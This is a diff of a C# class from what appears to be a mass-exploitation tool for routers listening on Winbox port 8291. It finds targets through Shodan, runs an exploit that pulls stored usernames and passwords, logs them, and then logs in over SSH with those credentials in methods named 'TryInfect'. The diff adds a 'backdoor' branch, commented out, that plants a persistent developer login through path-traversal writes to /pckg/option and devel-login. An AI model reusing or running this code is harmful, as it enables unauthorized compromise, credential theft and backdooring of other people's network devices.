@@ -19,8 +19,6 @@ public class ScanHelper
 {
     #region Locals
 
-    // private readonly object locker = new object();
-    // private readonly Stopwatch timer = new Stopwatch();
     private bool loggerInvoke { get; set; }
     public int inheritance = 0;
     public MainPage mainFormObject { get; set; }
@@ -39,14 +37,25 @@ public class ScanHelper
     private List<User> usersList { get; set; }
     public static string DecryptionKey = "283i4jfkai3389";
     public static int BufferSize = 1024;
-
-#endregion Locals
-
+    public static ShodanResponse _results;
+    public static string _osVersion;
+    public string _use;
+    private static Thread threadRunner;
+    public static int carryon = 0;
+    #endregion Locals
+    
+    public ScanHelper(Action<string, object> objLogger, bool needInvoke, MainPage main)
+    {
+        mainFormObject = main;
+        logger = objLogger;
+        loggerInvoke = needInvoke;
+    }
 
     public void SaveScanTime()
     {
         ScanTime = DateTime.Now.ToString("T");//GetTime().Replace("\\", "-");
     }
+
     public List<User> GetUsers(string ip, int port = 8291)
     {
         IPAddress addr = null;
@@ -57,9 +66,6 @@ public class ScanHelper
             {
                 mainFormObject.AddLog($"[-] '{ip}' is not a valid IP!");
             });
-#if DEBUG
-            Console.WriteLine($"'{ip}' is not a valid IP!");
-#endif
             return null;
         }
 
@@ -78,9 +84,6 @@ public class ScanHelper
                 {
                     mainFormObject.AddToLogFile($"[-] {ip}: Timed out! {ex.Message}");
                 });
-#if DEBUG
-                Console.WriteLine($"{ip}: Timed out!");
-#endif
                 return null;
             }
             catch (Exception ex)
@@ -90,9 +93,6 @@ public class ScanHelper
                     mainFormObject.AddToLogFile($"[-] {ip}: Unknown error: {ex.Message} \n");
                     mainFormObject.AddLog($"[-] {ip}: Unknown error: {ex.Message}");
                 });
-#if DEBUG
-                Console.WriteLine($"{ip}: Unknown error: {ex.Message}");
-#endif
                 return null;
             }
 
@@ -150,65 +150,103 @@ public class ScanHelper
 
         return Users;
     }
-    public void TryInfect(string ip, User user)
-    {
-        SSH ssh = new SSH(ip, user.Username, user.Password);
-        if (ssh.TryConnect())
-        {
-            ssh.SendCMD("whoami", mainFormObject);
-            mainFormObject.Dispatcher.Invoke(() =>
-            {
-                mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
-                mainFormObject.AddCred(user, ip, true);
-            });
-#if DEBUG
-            Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
-#endif
-        }
-        else
-        {
-            mainFormObject.Dispatcher.Invoke(() =>
-            {
-                mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
-                mainFormObject.AddCred(user, ip, false);
-            });
-#if DEBUG
-            Console.WriteLine($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}");
-#endif
-        }
-    }
-    public void TryInfectAsync(string ip, User user)
-    {
-        SSH ssh = new SSH(ip, user.Username, user.Password);
-        if (ssh.TryConnect())
-        {
-            ssh.SendCMD("whoami", mainFormObject);
-            mainFormObject.Dispatcher.Invoke(() =>
-            {
-                mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
-                mainFormObject.AddCred(user, ip, true);
-            });
-#if DEBUG
-            Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
-#endif
-        }
-        else
-        {
-            mainFormObject.Dispatcher.Invoke(() =>
-            {
-                mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
-                mainFormObject.AddCred(user, ip, false);
-            });
-#if DEBUG
-            Console.WriteLine($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}");
-#endif
-        }
-    }
 
+    public void TryInfect(string ip, User user, string command = "whoami")
+    {
+        SSH ssh = new SSH(ip, user.Username, user.Password);
+        switch (command)
+        {
+            case "whoami":
+            default:
+                if (ssh.TryConnect(0))
+                {
+                    ssh.SendCMD(command, mainFormObject);
+                    mainFormObject.Dispatcher.Invoke(() =>
+                    {
+                        mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                        mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
+                        mainFormObject.AddCred(user, ip, true);
+                    });
+                }
+                else
+                {
+                    mainFormObject.Dispatcher.Invoke(() =>
+                    {
+                        mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                        mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
+                        mainFormObject.AddCred(user, ip, false);
+                    });
+                }
+                break;
+            case "backdoor":
+                /*
+                 * Code Not Yet Test So Not Yet Implemented
+                 *
+                 
+                if (ssh.TryConnect(0))
+                {
+                    mainFormObject.Dispatcher.Invoke(() =>
+                    {
+                        mainFormObject.AddLog($"[*] Attempting to create /pckg/option on : '{user.Username}@{ip}'");
+                        mainFormObject.AddToLogFile($"[*] Attempting to create /pckg/option on : '{user.Username}@{ip}'");
+                    });
+                    ssh.SendCMD("//./.././.././../pckg/option", mainFormObject);
+                    carryon = 1;
+                    do { Thread.Sleep(1000); } while (carryon == 1);
+                    if (carryon == 0)
+                    {
+                        // Create new developer login on router using devel:[extracted_pass]
+                        mainFormObject.Dispatcher.Invoke(() =>
+                        {
+                            mainFormObject.AddLog($"[*] Attempting to create devel-login on : {ip} using credentials devel:{user.Password}");
+                            mainFormObject.AddToLogFile($"[*] Attempting to create devel-login on : {ip} using credentials devel:{user.Password}");
+                        });
+                        ssh.SendCMD("//./.././.././../flash/nova/etc/devel-login", mainFormObject);
+                        carryon = 1;
+                        do { Thread.Sleep(1000); } while (carryon == 1);
+                        if (carryon == 2)
+                        {
+                            mainFormObject.Dispatcher.Invoke(() =>
+                            {
+                                mainFormObject.AddLog($"[!] Failed to create devel-login on : {ip}");
+                                mainFormObject.AddToLogFile($"[!] Failed to create devel-login on : {ip}");
+                            });
+                        }
+                        else if (carryon == 0)
+                        {
+                            mainFormObject.Dispatcher.Invoke(() =>
+                            {
+                                mainFormObject.AddLog($"[*] Successfully created devel-login on : {ip} using credentials devel:{user.Password}");
+                                mainFormObject.AddToLogFile($"[*] Successfully created devel-login on : {ip} using credentials devel:{user.Password}");
+                            });                            
+                        }
+                    }
+                    else if (carryon == 2)
+                    {
+                        mainFormObject.Dispatcher.Invoke(() =>
+                        {
+                            mainFormObject.AddLog($"[!] Failed to create /pckg/option on : {ip}");
+                            mainFormObject.AddToLogFile($"[!] Failed to create /pckg/option on : {ip}");
+                        });
+                    }
+                }
+                else
+                {
+                    mainFormObject.Dispatcher.Invoke(() =>
+                    {
+                        mainFormObject.AddLog($"[!] FAILED to connect to: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                        mainFormObject.AddToLogFile($"[!] FAILED to connect to: '{user.Username}@{ip}' using password: {user.Password}\n");
+                    });
+                }
+                */
+                mainFormObject.Dispatcher.Invoke(() =>
+                {
+                    mainFormObject.AddLog($"[!] ERROR: Currently not Test so not Implemented");
+                });
+                break;
+        }
+    }
+    
     public string GetTime()
     {
         return "[" + DateTime.Now.ToString("G") + "]";
@@ -327,9 +365,6 @@ public class ScanHelper
                                 mainFormObject.AddLog($"[!] {GetTime()} CREDENTIALS FOUND:\n Username: {user.Username.PadRight(32)} Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                             });
                             Save($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}", "Credentials");
-#if DEBUG
-                            Console.WriteLine($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}", "Complete");
-#endif
                             sshThreads.Add(new Thread(() => TryInfect(_tar, user)));
                         }
 
@@ -341,9 +376,6 @@ public class ScanHelper
                             });
                             var _1 = $"Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}";
                             Save(_1, "List");
-#if DEBUG
-                            Console.WriteLine(_1);
-#endif
                         }
                         Parallel.ForEach(sshThreads, thread =>
                         {
@@ -383,9 +415,6 @@ public class ScanHelper
                         });
                         var _1 = $"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}";
                         Save(_1, "Credentials");
-#if DEBUG
-                        Console.WriteLine(_1);
-#endif
 
                         ///
                         // Running SSH Scans Simultanisously using Threads
@@ -417,12 +446,10 @@ public class ScanHelper
                         ///
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
-                            mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");// + Environment.NewLine);
+                            mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
+                            mainFormObject.AddToLogFile($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
                         });
-#if DEBUG
-                        Console.WriteLine($"Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
-#endif
-                        TryInfectAsync(target, user);
+                        TryInfect(target, user);
                     }
                     Thread.Sleep(2000);
                     mainFormObject.FillList();
@@ -434,9 +461,6 @@ public class ScanHelper
                         mainFormObject.AddLog("[!] Exploit Failed: Target " + target + " might not be vulnerable!");// + Environment.NewLine);
                         mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + target + " might not be vulnerable!\n");// + Environment.NewLine);
                     });
-#if DEBUG
-                    Console.WriteLine("Exploit Failed: Target might not be vulnerable!");
-#endif
                 }
             }
             mainFormObject.ScanStop();
@@ -445,17 +469,9 @@ public class ScanHelper
         {
             var dialogWindow = new ShellDialogWindow("Exploit Failed", ex.Message, true);
             dialogWindow.ShowDialog();
-#if DEBUG
-            Console.WriteLine(ex.Message.ToString());
-            Console.ReadLine();
-#endif
         }
     }
 
-    public static ShodanResponse _results;
-    public static string _osVersion;
-    public string _use;
-    private static Thread threadRunner;
     public void Start(bool usingShodan, string _intTarget)
     {
         var ShodanScan = "";
@@ -490,9 +506,6 @@ public class ScanHelper
                         mainFormObject.AddLog("[*] Found " + _results.matches.Count + " target IP's");
                         mainFormObject.AddToLogFile("[*] Found " + _results.matches.Count + " target IP's");
                     });
-#if DEBUG
-                    Console.WriteLine("Found " + _results.matches.Count + " IP's");
-#endif
                     foreach (Match m in _results.matches)
                     {
                         SaveShodan($"FOUND IPADDRESS: {m.ip}");
@@ -503,7 +516,6 @@ public class ScanHelper
                                 mainFormObject.AddLog($"[?] Attempting to Exploit: {m.ip_str}");
                                 mainFormObject.AddToLogFile($"[?] Attempting to Exploit: {m.ip_str}\n");
                             });
-                            //Console.WriteLine($"Attempting: {m.ip_str}");
                             _using = m.ip_str;
                             _use = m.ip_str;
                             Thread tr = new Thread(() => TryExploit(m.ip_str));
@@ -549,9 +561,6 @@ public class ScanHelper
             }
             catch (Exception ex)
             {
-#if DEBUG
-                Console.WriteLine(ex.ToString());
-#endif
                 mainFormObject.AddLog(ex.ToString());
                 var dialogWindow = new ShellDialogWindow("Error", ex.Message, false);
                 dialogWindow.ShowDialog();
@@ -559,16 +568,10 @@ public class ScanHelper
         }
         Thread.Sleep(5000);
         mainFormObject.AddLog($"[!] {GetTime()} Scan stopped successfully\n");
-        mainFormObject.AddToLogFile("\n\n\t[*] End of Scan: " + GetTime() + "\n\n###############################################################################\n\n");
+        mainFormObject.AddToLogFile("\n\n\t[*] End of Scan: " + GetTime() + "\n\n###########################################################################\n\n");
         mainFormObject.Dispatcher.Invoke(() =>
         {
             mainFormObject.StartScanButton.Content = "Start";
         });
-    }
-    public ScanHelper(Action<string, object> objLogger, bool needInvoke, MainPage main)
-    {
-        mainFormObject = main;
-        logger = objLogger;
-        loggerInvoke = needInvoke;
     }
 }
